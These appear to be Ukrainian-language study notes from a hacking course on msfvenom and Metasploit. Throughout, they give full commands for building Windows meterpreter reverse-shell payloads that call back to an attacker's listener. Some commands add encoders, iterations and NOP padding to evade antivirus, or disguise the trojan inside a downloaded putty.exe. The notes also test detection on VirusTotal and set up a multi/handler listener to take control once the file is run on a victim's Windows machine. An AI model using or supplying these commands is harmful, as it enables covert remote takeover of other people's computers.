заходжу з терміналу в msfvenom
msfvenom -h 
всі опції в справці допомагають більш-менш обійти антивірус
Опція --list formats дозволяє побачити формати в яких можна маскувати корисне навантаження. у всіх можливих типи файлів :

msfvenom --list formats
щоб створити і порівняти кілька типів корисного навантаження тотрібно зайти в firefox набравши в командному рядку 
firefox 
заходимо на сайт вайрес тотал який дає змогу перевірити завантажений мною вірус на те скільки поставщиків антивірусних програм можуть виявити його я к шкодоносну програму.
по посиланню : https://www.virustotal.com/gui/home/upload
або набравши в браузері
virustotal.
 створюю корисну нагрузку як в попередньому занятті:
 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.182 LPORT=5555 -f exe -o shell.exe
 
створюю друге корисне навантаження використовуючи додаткові опції  щоб їх побачити (опції  можна побачити визвавши справку msfvenom -h ) :
-**a** дозволяє назначати архітектуру корисного навантаження.
-**е** кодувальник допомагає обійти деякі віруси визивається :
msfvenom --list encoder
далі копіюємо потрібний (наприклад x64/zutto_dekiru )
-**і** вказує кількість ітерацій (15)
-n щось типу санок чи набалдашника (це інструкція процесору нічого не робити) 500 це скільки раз процесор ніхуя не робить 
-f  - вказує тип файлу який ми хочемо створити
exe - власне і є тип файлу, який ми створюємо
-o  - вивід (output)
 shell.exe  - імя файлу


msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.182 LPORT=5555  -a x64 -e x64/zutto_dekiru  -i 15 --platform windows -n 500 -f exe -o shell2.exe

ще краще використовувати шаблони. Якщо зайти в меню справки **msfvenom -h** 
i подивитися опцію **-x**
то побачимо що за допомогою цієї опції можна створювати шаблон за допомогою **іншої** програми.
(тобто корисне навантаження буде схоже на ту програму). Це спрацьовує **не завжди**.
наприклад зараз я буду використовувати програму putty.
для цього я заходжу в браузері в putty ( прямо тут же в Firefox). і вибираю завантаження програми затирки (замазки). потім шукаю виконувальний файл  донизу в розділі ## Alternative binary files
вибираю 64-bit Arm: [x00T0x00](https://the.earth.li/~sgtatham/putty/latest/wa64/putty.exe) [(signature)](https://the.earth.li/~sgtatham/putty/latest/wa64/putty.exe.gpg)  це і є файл для 64 бштної машини.
я його завантажую в папку загрузки(стандартно)
відкриваю термінал в **папці загрузки** і(обовязково в папці загрузки) запускаю команду (команда трохи відрізняється  від вказаної в відео і виводить трояна зразу на робочий стіл):

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.145 LPORT=5555 -e -x putty.exe  x86/shikata_ga_nai -f exe -o ~/Desktop/Putty.exe


далі заходжу в консоль msfconsole і запускаю експлойт з "кількома ручками":

use exploit/multi/handler
встановлюю корисну нагрузку в якості інтерпретатора :

set payload windows/x64/meterpreter/reverse_tcp 

встановлюю LHOST: 
set  LHOST 192.168.0.145

тоді встановляю порт прослушки:
set LPORT 5555
i набираю ран (запуск):
run

в цей час иотрібно доставити  створений файл Putty.exe на машину з віндовс і лоли вона запускається на вінді в мене  в калі відкривається вікно метерпретер:
meterpreter
в якому можна перехопити управління віндоюю. Наприклад набрати команду:
getuid 
і побачити час на машині віндовс.

#### згенерувати корисну нагрузку в іншому вигляді(наприклад python
)
згенерує в місці де відкритий термінал
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.145 LPORT=5555 -f python -o python_payload.py
це ніби добре але на цільовій маширі має бути встанеовлений пітон, бо без цьго це не має сенсу.

щоб згенерувати корисні нагрузки для інших систем або просто інші треба використати :
msfvenom --list payloads
